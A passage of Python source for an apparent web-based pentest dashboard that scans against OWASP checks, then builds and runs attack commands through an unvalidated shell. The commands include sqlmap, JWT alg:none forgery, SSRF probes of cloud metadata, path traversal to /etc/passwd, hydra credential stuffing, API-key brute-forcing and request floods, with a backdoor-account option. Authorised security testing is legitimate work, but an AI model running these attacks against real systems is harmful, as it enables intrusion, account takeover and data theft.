        return None, "⚠️ Enter a Base URL first.", True

    # Build headers
    headers: dict = {}
    if auth_hdr:
        parts = auth_hdr.split(":", 1)
        if len(parts) == 2:
            headers[parts[0].strip()] = parts[1].strip()
    if extra_hdrs:
        try:
            headers.update(json.loads(extra_hdrs))
        except Exception:
            pass

    # Combine both check lists
    selected_checks = list(api_checks or []) + list(web_checks or [])

    scan_id = str(uuid.uuid4())[:8]
    threading.Thread(
        target=_run_scan,
        args=(scan_id, base_url, headers, spec_text or "", selected_checks),
        daemon=True,
    ).start()

    total = len(selected_checks)
    return scan_id, f"🚀 Scan started with {total} checks…", False


@callback(
    Output("api-findings-list", "children"),
    Output("api-summary-bar",   "children"),
    Output("api-status",        "children", allow_duplicate=True),
    Output("api-poll",          "disabled", allow_duplicate=True),
    Input("api-poll",           "n_intervals"),
    State("api-scan-id",        "data"),
    prevent_initial_call=True,
)
def poll_results(_, scan_id):
    if not scan_id:
        raise PreventUpdate

    with _LOCK:
        findings = list(_RESULTS.get(scan_id, []))
        status   = _STATUS.get(scan_id, "")

    done = status.startswith("✅ Scan complete") or status.startswith("❌")
    poll_disabled = done

    # Summary bar
    counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    summary = html.Div([
        html.Span(f"{counts[sev]} {sev}",
                  style={"background": SEV_COLOR[sev],
                         "color": "#000" if sev in ("Medium", "Low") else "#fff",
                         "padding": "4px 10px", "borderRadius": "4px",
                         "fontSize": "11px", "fontWeight": "700",
                         "marginRight": "6px"})
        for sev in ["Critical", "High", "Medium", "Low", "Info"]
        if counts[sev] > 0
    ], style={"display": "flex", "flexWrap": "wrap", "gap": "4px"})

    # Findings list
    if not findings:
        list_div = html.Div("No findings yet…",
                            style={"color": "#636e72", "fontSize": "13px"})
    else:
        rows = []
        for f in findings:
            rows.append(
                html.Div([
                    html.Div([
                        _severity_badge(f["severity"]),
                        html.Span(f["name"],
                                  style={"color": "#e0e0e0", "fontSize": "13px",
                                         "fontWeight": "600"}),
                        html.Span(f"  [{f['check'].upper()}]",
                                  style={"color": "#636e72", "fontSize": "11px"}),
                    ]),
                    html.Div(f["detail"],
                             style={"color": "#8e9eb0", "fontSize": "12px",
                                    "marginTop": "2px"}),
                    html.Div(f["evidence"],
                             style={"color": "#636e72", "fontSize": "11px",
                                    "fontFamily": "monospace"}),
                ], id={"type": "api-finding-row", "index": f["id"]},
                   n_clicks=0,
                   style={"padding": "10px", "borderBottom": "1px solid #1e1e1e",
                          "cursor": "pointer"},
                )
            )
        list_div = html.Div(rows)

    return list_div, summary, status, poll_disabled


@callback(
    Output("api-detail-panel",    "children"),
    Output("api-selected-finding","data"),
    Input({"type": "api-finding-row", "index": ALL}, "n_clicks"),
    State("api-scan-id", "data"),
    prevent_initial_call=True,
)
def show_detail(n_clicks_list, scan_id):
    from dash import ctx
    if not ctx.triggered_id:
        raise PreventUpdate
    finding_id = ctx.triggered_id.get("index")
    with _LOCK:
        findings = _RESULTS.get(scan_id, [])
    f = next((x for x in findings if x["id"] == finding_id), None)
    if not f:
        raise PreventUpdate

    detail = html.Div([
        html.Div([_severity_badge(f["severity"]),
                  html.Strong(f["name"], style={"color": "#e0e0e0"})]),
        html.Hr(style={"borderColor": "#1e1e1e", "margin": "8px 0"}),
        html.Div([html.Strong("Check: ", style={"color": "#8e9eb0"}),
                  f["check"].upper()], style={"marginBottom": "4px", "fontSize": "12px"}),
        html.Div([html.Strong("Detail: ", style={"color": "#8e9eb0"}),
                  f["detail"]], style={"marginBottom": "4px", "fontSize": "12px"}),
        html.Div([html.Strong("Evidence: ", style={"color": "#8e9eb0"}),
                  html.Code(f["evidence"],
                            style={"fontSize": "11px", "color": "#50fa7b"})],
                 style={"marginBottom": "4px"}),
        html.Div([html.Strong("Time: ", style={"color": "#8e9eb0"}), f["ts"]],
                 style={"fontSize": "11px", "color": "#636e72"}),
    ])
    return detail, f


@callback(
    Output("api-ai-output", "children"),
    Input("api-ai-btn",     "n_clicks"),
    State("api-selected-finding", "data"),
    State("api-scan-id",    "data"),
    prevent_initial_call=True,
)
def ai_remediate(n, finding, scan_id):
    if not n:
        raise PreventUpdate

    with _LOCK:
        all_findings = list(_RESULTS.get(scan_id, []))

    if finding:
        prompt = (
            f"You are an API security expert. A vulnerability was found:\n"
            f"- Check: {finding.get('check','').upper()} — {finding.get('name','')}\n"
            f"- Severity: {finding.get('severity','')}\n"
            f"- Detail: {finding.get('detail','')}\n"
            f"- Evidence: {finding.get('evidence','')}\n\n"
            f"Provide: 1) What this vulnerability is, 2) How to exploit it in a pentest, "
            f"3) Exact remediation steps for the developer, 4) CVSS estimate."
        )
    elif all_findings:
        summary_lines = "\n".join(
            f"- [{f['severity']}] {f['name']}: {f['detail']}" for f in all_findings[:15]
        )
        prompt = (
            f"You are an API security expert. Here are the findings from an OWASP API Top 10 scan:\n"
            f"{summary_lines}\n\n"
            f"Provide a concise executive summary of the risk posture, top 3 priority fixes, "
            f"and a remediation roadmap."
        )
    else:
        return "Select a finding first or run a scan to get AI analysis."

    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


@callback(
    Output("api-download", "data"),
    Input("api-export-json", "n_clicks"),
    Input("api-export-csv",  "n_clicks"),
    State("api-scan-id",     "data"),
    prevent_initial_call=True,
)
def export_findings(json_n, csv_n, scan_id):
    from dash import ctx
    if not scan_id:
        raise PreventUpdate
    with _LOCK:
        findings = list(_RESULTS.get(scan_id, []))
    if not findings:
        raise PreventUpdate

    if ctx.triggered_id == "api-export-json":
        content = json.dumps(findings, indent=2)
        return dcc.send_string(content, "api_findings.json")
    else:
        import csv, io
        buf = io.StringIO()
        w = csv.DictWriter(buf, fieldnames=["id","check","name","severity","detail","evidence","ts"])
        w.writeheader()
        w.writerows(findings)
        return dcc.send_string(buf.getvalue(), "api_findings.csv")


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE CONTENT BUILDERS
# ═══════════════════════════════════════════════════════════════════════════════

# ── Shared phase helpers ──────────────────────────────────────────────────────

def _phase_cmd_card(phase_id: str, title: str, placeholder: str,
                    btn_label: str = "▶ Run", extra_controls=None):
    """Reusable command-runner card for each phase."""
    return _card(
        html.Div(title, style={"color": "#e0e0e0", "fontWeight": "600",
                               "marginBottom": "10px"}),
        *(extra_controls or []),
        _label("Command"),
        dbc.Textarea(id=f"{phase_id}-cmd",
                     placeholder=placeholder,
                     style={**INPUT_STY, "height": "80px",
                            "fontFamily": "monospace", "fontSize": "12px",
                            "marginBottom": "8px"}),
        dbc.Row([
            dbc.Col(dbc.Button(btn_label, id=f"{phase_id}-run-btn",
                               color="danger", size="sm",
                               style={**BTN_SM, "width": "100%"}), width=8),
            dbc.Col(dbc.Button("✨ AI", id=f"{phase_id}-ai-btn",
                               color="outline-info", size="sm",
                               style={**BTN_SM, "width": "100%"}), width=4),
        ], style={"marginBottom": "8px"}),
        _label("Output"),
        dbc.Textarea(id=f"{phase_id}-output",
                     value="", readOnly=True,
                     style={**INPUT_STY, "height": "180px",
                            "fontFamily": "monospace", "fontSize": "11px",
                            "color": "#50fa7b"}),
        html.Div(id=f"{phase_id}-ai-out",
                 style={"color": "#b0b0b0", "fontSize": "12px",
                        "marginTop": "8px", "whiteSpace": "pre-wrap"}),
    )


def _phase_run_bg(phase_id: str, cmd: str):
    """Run a shell command in background, store output in _CMD_OUTPUTS."""
    import subprocess
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=120
        )
        out = (result.stdout or "") + (result.stderr or "")
    except subprocess.TimeoutExpired:
        out = "⚠️ Command timed out after 120s"
    except Exception as e:
        out = f"❌ Error: {e}"
    with _LOCK:
        _CMD_OUTPUTS[phase_id] = out


_CMD_OUTPUTS: dict[str, str] = {}   # phase_id → last command output


# ── Phase 1: Recon & Scan (existing layout, returned as-is) ──────────────────

def _phase_recon_content():
    """Returns the existing recon 3-column grid."""
    return dbc.Row([
        # ── Left: Config ─────────────────────────────────────────────────
        dbc.Col([
            _card(
                html.Div("🎯 Target Configuration",
                         style={"color": "#e0e0e0", "fontWeight": "600",
                                "marginBottom": "12px"}),
                _label("Base URL"),
                dbc.Input(id="api-base-url", placeholder="http://192.168.1.113",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Auth Header (optional)"),
                dbc.Input(id="api-auth-header",
                          placeholder="Authorization: Bearer eyJ...",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Extra Headers (JSON, optional)"),
                dbc.Textarea(id="api-extra-headers",
                             placeholder='{"X-API-Key": "secret"}',
                             style={**INPUT_STY, "height": "60px",
                                    "marginBottom": "10px"}),
                _label("OpenAPI / Swagger Spec (optional)"),
                dbc.Textarea(id="api-spec-input",
                             placeholder="Paste openapi.json or swagger.yaml here…",
                             style={**INPUT_STY, "height": "90px",
                                    "marginBottom": "12px"}),
            ),
            _card(
                html.Div("🧪 OWASP API Top 10",
                         style={"color": "#e0e0e0", "fontWeight": "600",
                                "marginBottom": "10px"}),
                dbc.Checklist(
                    id="api-checks",
                    options=[{"label": f"{c['id'].upper()}: {c['name']}", "value": c["id"]}
                             for c in OWASP_CHECKS],
                    value=[c["id"] for c in OWASP_CHECKS],
                    style={"color": "#b0b0b0", "fontSize": "12px"},
                    inputStyle={"marginRight": "6px"},
                ),
                html.Div([
                    dbc.Button("All", id="api-checks-all", size="sm",
                               color="outline-secondary",
                               style={**BTN_SM, "marginRight": "6px", "marginTop": "10px"}),
                    dbc.Button("Clear", id="api-checks-none", size="sm",
                               color="outline-secondary",
                               style={**BTN_SM, "marginTop": "10px"}),
                ]),
            ),
            _card(
                html.Div("🌐 OWASP Web Top 10",
                         style={"color": "#e0e0e0", "fontWeight": "600",
                                "marginBottom": "10px"}),
                dbc.Checklist(
                    id="web-checks",
                    options=[{"label": f"{c['id'].upper()}: {c['name']}", "value": c["id"]}
                             for c in OWASP_WEB_CHECKS],
                    value=[c["id"] for c in OWASP_WEB_CHECKS],
                    style={"color": "#b0b0b0", "fontSize": "12px"},
                    inputStyle={"marginRight": "6px"},
                ),
                html.Div([
                    dbc.Button("All", id="web-checks-all", size="sm",
                               color="outline-secondary",
                               style={**BTN_SM, "marginRight": "6px", "marginTop": "10px"}),
                    dbc.Button("Clear", id="web-checks-none", size="sm",
                               color="outline-secondary",
                               style={**BTN_SM, "marginTop": "10px"}),
                ]),
            ),
            dbc.Button("▶  Run Assessment", id="api-run-btn",
                       color="danger", size="lg",
                       style={**BTN_SM, "width": "100%", "marginTop": "4px",
                              "padding": "12px", "fontSize": "14px"}),
            html.Div(id="api-status",
                     style={"color": "#636e72", "fontSize": "12px",
                            "marginTop": "10px", "minHeight": "20px"}),
        ], width=3),

        # ── Centre: Findings ──────────────────────────────────────────────
        dbc.Col([
            html.Div(id="api-summary-bar", style={"marginBottom": "12px"}),
            _card(
                html.Div("📋 Findings", style={"color": "#e0e0e0", "fontWeight": "600",
                                               "marginBottom": "10px"}),
                html.Div(id="api-findings-list",
                         style={"maxHeight": "520px", "overflowY": "auto"}),
                style={"padding": "14px"},
            ),
        ], width=5),

        # ── Right: Detail + AI + Export ───────────────────────────────────
        dbc.Col([
            _card(
                html.Div("🔍 Finding Detail",
                         style={"color": "#e0e0e0", "fontWeight": "600",
                                "marginBottom": "10px"}),
                html.Div(id="api-detail-panel",
                         style={"color": "#b0b0b0", "fontSize": "13px",
                                "minHeight": "120px"}),
            ),
            _card(
                html.Div("🤖 AI Remediation",
                         style={"color": "#e0e0e0", "fontWeight": "600",
                                "marginBottom": "10px"}),
                dbc.Button("✨ Analyse with AI", id="api-ai-btn",
                           color="outline-info", size="sm",
                           style={**BTN_SM, "marginBottom": "10px"}),
                html.Div(id="api-ai-output",
                         style={"color": "#b0b0b0", "fontSize": "12px",
                                "minHeight": "80px", "whiteSpace": "pre-wrap"}),
            ),
            _card(
                html.Div("📤 Export", style={"color": "#e0e0e0", "fontWeight": "600",
                                             "marginBottom": "10px"}),
                dbc.Row([
                    dbc.Col(dbc.Button("⬇ JSON", id="api-export-json",
                                       color="outline-secondary", size="sm",
                                       style=BTN_SM), width=6),
                    dbc.Col(dbc.Button("⬇ CSV",  id="api-export-csv",
                                       color="outline-secondary", size="sm",
                                       style=BTN_SM), width=6),
                ]),
                dcc.Download(id="api-download"),
            ),
        ], width=4),
    ])


# ── Phase 2: Exploit ──────────────────────────────────────────────────────────

def _generate_exploit_cmd(finding: dict, base_url: str = "") -> str:
    """Auto-generate exploit command from a scan finding."""
    check = finding.get("check", "")
    evidence = finding.get("evidence", "")
    url = base_url or "TARGET_URL"

    # Extract URL from evidence if possible
    m = re.search(r'(https?://\S+)', evidence)
    if m:
        url = m.group(1).split("→")[0].strip()

    if check in ("api3", "a03"):
        return (f"# SQL Injection — sqlmap\n"
                f"sqlmap -u \"{url}\" --dbs --batch --level=3 --risk=2\n\n"
                f"# XSS — dalfox\n"
                f"dalfox url \"{url}\" --skip-bav")
    elif check == "api2":
        return (f"# JWT alg:none bypass\n"
                f"python3 -c \"\nimport base64, json\n"
                f"header = base64.b64encode(b'{{\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}}').decode().rstrip('=')\n"
                f"payload = base64.b64encode(b'{{\\\"sub\\\":\\\"admin\\\",\\\"role\\\":\\\"admin\\\"}}').decode().rstrip('=')\n"
                f"print(f'{{header}}.{{payload}}.')\"")
    elif check == "api5":
        return (f"# Broken Function-Level Auth — curl without token\n"
                f"curl -v -s '{url}' | head -50\n\n"
                f"# Try HTTP verbs\n"
                f"for METHOD in GET POST PUT DELETE PATCH; do\n"
                f"  echo \"--- $METHOD ---\"\n"
                f"  curl -s -X $METHOD '{url}' -w '\\nStatus: %{{http_code}}\\n'\n"
                f"done")
    elif check in ("api4",):
        return (f"# Rate Limiting — rapid flood with ab (Apache Bench)\n"
                f"ab -n 500 -c 50 '{url}'\n\n"
                f"# Or with siege\n"
                f"siege -c 30 -t 10S '{url}'")
    elif check in ("a01",):
        return (f"# Path Traversal — ffuf wordlist fuzz\n"
                f"ffuf -u '{base_url}/FUZZ' -w /usr/share/wordlists/dirb/common.txt "
                f"-mc 200,301,302 -t 40\n\n"
                f"# Manual traversal\n"
                f"curl -v '{base_url}/../../../../etc/passwd'")
    elif check in ("a10",):
        return (f"# SSRF probe\n"
                f"curl -v '{url}?url=http://169.254.169.254/latest/meta-data/'\n"
                f"curl -v '{url}?url=http://127.0.0.1:22'\n"
                f"curl -v '{url}?url=http://localhost/admin'")
    elif check in ("api1",):
        return (f"# IDOR / BOLA — enumerate IDs\n"
                f"for i in $(seq 1 50); do\n"
                f"  echo -n \"ID $i: \"\n"
                f"  curl -s '{url}' | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d)' 2>/dev/null || echo 'non-JSON'\n"
                f"done")
    else:
        return (f"# Generic probe for [{check.upper()}] {finding.get('name','')}\n"
                f"curl -v -s '{url}'\n\n"
                f"# Nikto web scan\n"
                f"nikto -h '{base_url}' -o /tmp/nikto_out.txt")


def _phase_exploit_content():
    return dbc.Row([
        dbc.Col([
            _card(
                html.Div("💥 Exploit Queue", style={"color": "#e0e0e0", "fontWeight": "600",
                                                    "marginBottom": "10px"}),
                html.Div("Run Phase 1 (Recon) first, then click a finding below to auto-generate an exploit command.",
                         style={"color": "#636e72", "fontSize": "12px", "marginBottom": "10px"}),
                html.Div(id="exploit-queue",
                         style={"maxHeight": "380px", "overflowY": "auto"}),
            ),
        ], width=4),
        dbc.Col([
            _phase_cmd_card(
                "exploit",
                "⚡ Exploit Command",
                "Click a finding ← to auto-fill, or enter command manually…",
                "▶ Run Exploit",
            ),
        ], width=8),
    ])


# ── Phase 3: Lateral Movement ────────────────────────────────────────────────

def _phase_lateral_content():
    return dbc.Row([
        dbc.Col([
            _card(
                html.Div("🌐 Lateral Movement", style={"color": "#e0e0e0", "fontWeight": "600",
                                                       "marginBottom": "10px"}),
                _label("Captured Token / Session Cookie"),
                dbc.Input(id="lateral-token",
                          placeholder="Bearer eyJ... or PHPSESSID=abc123",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Target Host / Internal IP"),
                dbc.Input(id="lateral-target",
                          placeholder="10.0.0.1 or 192.168.1.x",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Technique"),
                dbc.Select(id="lateral-technique",
                           options=[
                               {"label": "Token Reuse — replay across endpoints", "value": "token_reuse"},
                               {"label": "SSRF Pivot — reach internal services",  "value": "ssrf_pivot"},
                               {"label": "Credential Stuffing — try creds on login", "value": "cred_stuff"},
                               {"label": "API Key Brute — common key patterns",   "value": "apikey_brute"},
                               {"label": "JWT Horizontal — swap user ID in JWT",  "value": "jwt_horiz"},
                           ],
                           value="token_reuse",
                           style={**INPUT_STY, "marginBottom": "12px"}),
                dbc.Button("⚙ Build Command", id="lateral-build-btn",
                           color="outline-warning", size="sm",
                           style={**BTN_SM, "width": "100%"}),
            ),
        ], width=3),
        dbc.Col([
            _phase_cmd_card(
                "lateral",
                "🌐 Lateral Movement Command",
                "Click ⚙ Build Command to auto-generate, or enter manually…",
                "▶ Execute",
            ),
        ], width=9),
    ])


# ── Phase 4: Privilege Escalation ────────────────────────────────────────────

def _phase_privesc_content():
    return dbc.Row([
        dbc.Col([
            _card(
                html.Div("⬆ PrivEsc Config", style={"color": "#e0e0e0", "fontWeight": "600",
                                                     "marginBottom": "10px"}),
                _label("Current (Low-Priv) Token"),
                dbc.Input(id="privesc-token",
                          placeholder="Bearer eyJ...",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Target Endpoint"),
                dbc.Input(id="privesc-target",
                          placeholder="http://target/api/admin",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Technique"),
                dbc.Select(id="privesc-technique",
                           options=[
                               {"label": "JWT alg:none — unsigned token",      "value": "jwt_none"},
                               {"label": "JWT claim — set role: admin",        "value": "jwt_claim"},
                               {"label": "Parameter Tampering — ?admin=true",  "value": "param_tamper"},
                               {"label": "Mass Assignment — isAdmin: true",    "value": "mass_assign"},
                               {"label": "HTTP Verb Tampering — PATCH/PUT",    "value": "verb_tamper"},
                               {"label": "Account Takeover — reset token",     "value": "acct_takeover"},
                           ],
                           value="jwt_none",
                           style={**INPUT_STY, "marginBottom": "12px"}),
                dbc.Button("⚙ Build PoC", id="privesc-build-btn",
                           color="outline-warning", size="sm",
                           style={**BTN_SM, "width": "100%"}),
            ),
        ], width=3),
        dbc.Col([
            _phase_cmd_card(
                "privesc",
                "⬆ Privilege Escalation PoC",
                "Click ⚙ Build PoC to auto-generate a privilege escalation proof-of-concept…",
                "▶ Run PoC",
            ),
        ], width=9),
    ])


# ── Phase 5: Post-Exploitation ────────────────────────────────────────────────

def _phase_postex_content():
    return dbc.Row([
        dbc.Col([
            _card(
                html.Div("🕵 Post-Ex Config", style={"color": "#e0e0e0", "fontWeight": "600",
                                                      "marginBottom": "10px"}),
                _label("Auth Token (admin)"),
                dbc.Input(id="postex-token",
                          placeholder="Bearer eyJ... (admin token)",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Base URL"),
                dbc.Input(id="postex-base",
                          placeholder="http://target/api",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Action"),
                dbc.Select(id="postex-action",
                           options=[
                               {"label": "Enumerate Users",          "value": "enum_users"},
                               {"label": "Dump All Resources",       "value": "dump_all"},
                               {"label": "Extract Secrets from Body","value": "extract_secrets"},
                               {"label": "SSRF File Read",          "value": "ssrf_read"},
                               {"label": "Create Backdoor Account",  "value": "backdoor"},
                               {"label": "Download Database Export", "value": "db_export"},
                           ],
                           value="enum_users",
                           style={**INPUT_STY, "marginBottom": "12px"}),
                dbc.Button("⚙ Build Command", id="postex-build-btn",
                           color="outline-warning", size="sm",
                           style={**BTN_SM, "width": "100%"}),
                html.Hr(style={"borderColor": "#1e1e1e", "margin": "12px 0"}),
                html.Div("📦 Artefact Log",
                         style={"color": "#8e9eb0", "fontSize": "11px",
                                "fontWeight": "600", "marginBottom": "6px"}),
                html.Div(id="postex-artifact-log",
                         style={"color": "#636e72", "fontSize": "11px",
                                "fontFamily": "monospace"}),
            ),
        ], width=3),
        dbc.Col([
            _phase_cmd_card(
                "postex",
                "🕵 Post-Exploitation Command",
                "Click ⚙ Build Command or enter manually…",
                "▶ Execute",
            ),
        ], width=9),
    ])


# ── Phase 6: Cleanup ─────────────────────────────────────────────────────────

def _phase_cleanup_content():
    return dbc.Row([
        dbc.Col([
            _card(
                html.Div("🧹 Tracked Artefacts", style={"color": "#e0e0e0", "fontWeight": "600",
                                                         "marginBottom": "10px"}),
                html.Div("Items created during testing that should be removed:",
                         style={"color": "#636e72", "fontSize": "12px",
                                "marginBottom": "10px"}),
                html.Div(id="cleanup-artifact-list"),
                html.Hr(style={"borderColor": "#1e1e1e", "margin": "12px 0"}),
                dbc.Button("⚙ Generate Cleanup Commands", id="cleanup-build-btn",
                           color="outline-warning", size="sm",
                           style={**BTN_SM, "width": "100%", "marginBottom": "6px"}),
                dbc.Button("✅ Mark All Done", id="cleanup-done-btn",
                           color="outline-success", size="sm",
                           style={**BTN_SM, "width": "100%"}),
            ),
        ], width=3),
        dbc.Col([
            _phase_cmd_card(
                "cleanup",
                "🧹 Cleanup Commands",
                "Commands to remove test data, revoke tokens, restore state…",
                "▶ Run Cleanup",
                extra_controls=[
                    html.Div("⚠️ Review these commands before running — they delete data.",
                             style={"color": "#ffd60a", "fontSize": "11px",
                                    "marginBottom": "8px"}),
                ],
            ),
        ], width=9),
    ])


# ── Phase 7: Report ───────────────────────────────────────────────────────────

def _phase_report_content():
    return dbc.Row([
        dbc.Col([
            _card(
                html.Div("📄 Report Config", style={"color": "#e0e0e0", "fontWeight": "600",
                                                    "marginBottom": "10px"}),
                _label("Engagement Name"),
                dbc.Input(id="report-engagement",
                          placeholder="API Pentest — Target Corp",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Tester Name"),
                dbc.Input(id="report-tester",
                          placeholder="Your Name",
                          style={**INPUT_STY, "marginBottom": "10px"}),
                _label("Date"),
                dbc.Input(id="report-date",
                          value=datetime.now().strftime("%Y-%m-%d"),
                          style={**INPUT_STY, "marginBottom": "12px"}),
                _label("Include Sections"),
                dbc.Checklist(
                    id="report-sections",
                    options=[
                        {"label": "Executive Summary",    "value": "exec"},
                        {"label": "Scope & Methodology",  "value": "scope"},
                        {"label": "Findings Table",       "value": "findings"},
                        {"label": "Evidence / Output",    "value": "evidence"},
                        {"label": "PoC Commands",         "value": "poc"},
                        {"label": "Remediation Roadmap",  "value": "roadmap"},
                    ],
                    value=["exec", "scope", "findings", "evidence", "poc", "roadmap"],
                    style={"color": "#b0b0b0", "fontSize": "12px"},
                    inputStyle={"marginRight": "6px"},
                ),
                html.Hr(style={"borderColor": "#1e1e1e", "margin": "12px 0"}),
                dbc.Button("🤖 Generate with AI", id="report-gen-btn",
                           color="danger", size="sm",
                           style={**BTN_SM, "width": "100%", "marginBottom": "6px"}),
                dbc.Button("⬇ Export HTML", id="report-export-btn",
                           color="outline-secondary", size="sm",
                           style={**BTN_SM, "width": "100%"}),
                dcc.Download(id="report-download"),
            ),
        ], width=3),
        dbc.Col([
            _card(
                html.Div("📄 Pentest Report", style={"color": "#e0e0e0", "fontWeight": "600",
                                                      "marginBottom": "10px"}),
                html.Div(id="report-output",
                         style={"color": "#b0b0b0", "fontSize": "13px",
                                "whiteSpace": "pre-wrap", "fontFamily": "monospace",
                                "minHeight": "500px", "maxHeight": "600px",
                                "overflowY": "auto"}),
            ),
        ], width=9),
    ])


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE ROUTING CALLBACK
# ═══════════════════════════════════════════════════════════════════════════════

@callback(
    Output("api-phase-content", "children"),
    Input("api-phase-tabs", "active_tab"),
)
def render_phase(active_tab):
    if active_tab == "phase-recon"   or not active_tab:
        return _phase_recon_content()
    elif active_tab == "phase-exploit":
        return _phase_exploit_content()
    elif active_tab == "phase-lateral":
        return _phase_lateral_content()
    elif active_tab == "phase-privesc":
        return _phase_privesc_content()
    elif active_tab == "phase-postex":
        return _phase_postex_content()
    elif active_tab == "phase-cleanup":
        return _phase_cleanup_content()
    elif active_tab == "phase-report":
        return _phase_report_content()
    return html.Div("Unknown phase", style={"color": "red"})


# ═══════════════════════════════════════════════════════════════════════════════
# EXPLOIT PHASE CALLBACKS
# ═══════════════════════════════════════════════════════════════════════════════

@callback(
    Output("exploit-queue", "children"),
    Input("api-phase-tabs", "active_tab"),
    State("api-scan-id", "data"),
)
def populate_exploit_queue(tab, scan_id):
    if tab != "phase-exploit" or not scan_id:
        raise PreventUpdate
    with _LOCK:
        findings = list(_RESULTS.get(scan_id, []))
    if not findings:
        return html.Div("No scan findings yet — run Phase 1 first.",
                        style={"color": "#636e72", "fontSize": "12px"})
    rows = []
    for f in findings:
        rows.append(
            html.Div([
                _severity_badge(f["severity"]),
                html.Span(f["name"], style={"color": "#e0e0e0", "fontSize": "12px"}),
                html.Div(f["check"].upper(),
                         style={"color": "#636e72", "fontSize": "10px"}),
            ], id={"type": "exploit-queue-item", "index": f["id"]},
               n_clicks=0,
               style={"padding": "8px", "borderBottom": "1px solid #1e1e1e",
                      "cursor": "pointer"})
        )
    return html.Div(rows)


@callback(
    Output("exploit-cmd", "value"),
    Input({"type": "exploit-queue-item", "index": ALL}, "n_clicks"),
    State("api-scan-id", "data"),
    State("api-base-url", "data") if False else State("api-scan-id", "data"),
    prevent_initial_call=True,
)
def fill_exploit_cmd(n_clicks_list, scan_id, _):
    from dash import ctx
    if not ctx.triggered_id:
        raise PreventUpdate
    finding_id = ctx.triggered_id.get("index")
    with _LOCK:
        findings = _RESULTS.get(scan_id, [])
    f = next((x for x in findings if x["id"] == finding_id), None)
    if not f:
        raise PreventUpdate
    return _generate_exploit_cmd(f)


@callback(
    Output("exploit-output", "value"),
    Input("exploit-run-btn", "n_clicks"),
    State("exploit-cmd", "value"),
    prevent_initial_call=True,
)
def run_exploit(n, cmd):
    if not n or not cmd:
        raise PreventUpdate
    threading.Thread(target=_phase_run_bg, args=("exploit", cmd), daemon=True).start()
    return f"$ {cmd}\n[Running…]"


@callback(
    Output("exploit-ai-out", "children"),
    Input("exploit-ai-btn", "n_clicks"),
    State("exploit-cmd", "value"),
    State("exploit-output", "value"),
    prevent_initial_call=True,
)
def exploit_ai(n, cmd, output):
    if not n:
        raise PreventUpdate
    prompt = (f"You are a senior penetration tester. The following exploit command was run:\n"
              f"```\n{cmd}\n```\n"
              f"Output:\n```\n{(output or '')[:1000]}\n```\n\n"
              f"Explain: 1) What this exploit does, 2) What the output means, "
              f"3) Next steps to deepen access, 4) How to document this for a report.")
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


# ═══════════════════════════════════════════════════════════════════════════════
# LATERAL MOVEMENT CALLBACKS
# ═══════════════════════════════════════════════════════════════════════════════

@callback(
    Output("lateral-cmd", "value"),
    Input("lateral-build-btn", "n_clicks"),
    State("lateral-token",     "value"),
    State("lateral-target",    "value"),
    State("lateral-technique", "value"),
    prevent_initial_call=True,
)
def build_lateral_cmd(n, token, target, technique):
    if not n:
        raise PreventUpdate
    tok = token or "TOKEN"
    tgt = target or "192.168.1.x"
    if technique == "token_reuse":
        return (f"# Token Reuse — replay token on other endpoints\n"
                f"for EP in /api/users /api/admin /api/settings /api/config; do\n"
                f"  echo \"=== $EP ===\"\n"
                f"  curl -s -H 'Authorization: {tok}' http://{tgt}$EP\n"
                f"done")
    elif technique == "ssrf_pivot":
        return (f"# SSRF Pivot to internal services\n"
                f"curl -s 'http://{tgt}/api?url=http://169.254.169.254/latest/meta-data/'\n"
                f"curl -s 'http://{tgt}/api?url=http://10.0.0.1/admin'\n"
                f"curl -s 'http://{tgt}/api?url=http://127.0.0.1:8080'")
    elif technique == "cred_stuff":
        return (f"# Credential Stuffing — try found creds on login\n"
                f"hydra -L /tmp/users.txt -P /tmp/passwords.txt {tgt} http-post-form "
                f"'/login:username=^USER^&password=^PASS^:F=Invalid'")
    elif technique == "apikey_brute":
        return (f"# API Key brute-force — common patterns\n"
                f"for KEY in test test123 secret api_key admin changeme; do\n"
                f"  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' "
                f"-H \"X-API-Key: $KEY\" http://{tgt}/api/data)\n"
                f"  echo \"$KEY → $CODE\"\n"
                f"done")
    elif technique == "jwt_horiz":
        return (f"# JWT Horizontal Privilege — swap user ID in payload\n"
                f"python3 << 'EOF'\nimport base64, json\n"
                f"# Decode existing token (no signature verification)\n"
                f"token = '{tok}'\nparts = token.split('.')\n"
                f"payload = json.loads(base64.b64decode(parts[1] + '==').decode())\n"
                f"print('Current payload:', payload)\n"
                f"# Change user ID and re-encode with alg:none\n"
                f"payload['sub'] = '1'  # target user ID\n"
                f"new_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')\n"
                f"header = base64.b64encode(b'{{\"alg\":\"none\"}}').decode().rstrip('=')\n"
                f"print('New token:', f'{{header}}.{{new_payload}}.')\nEOF")
    return f"# Build for {technique} against {tgt} with token {tok[:20]}…"


@callback(
    Output("lateral-output", "value"),
    Input("lateral-run-btn", "n_clicks"),
    State("lateral-cmd", "value"),
    prevent_initial_call=True,
)
def run_lateral(n, cmd):
    if not n or not cmd:
        raise PreventUpdate
    threading.Thread(target=_phase_run_bg, args=("lateral", cmd), daemon=True).start()
    return f"$ {cmd}\n[Running…]"


@callback(
    Output("lateral-ai-out", "children"),
    Input("lateral-ai-btn", "n_clicks"),
    State("lateral-cmd", "value"),
    State("lateral-output", "value"),
    prevent_initial_call=True,
)
def lateral_ai(n, cmd, output):
    if not n:
        raise PreventUpdate
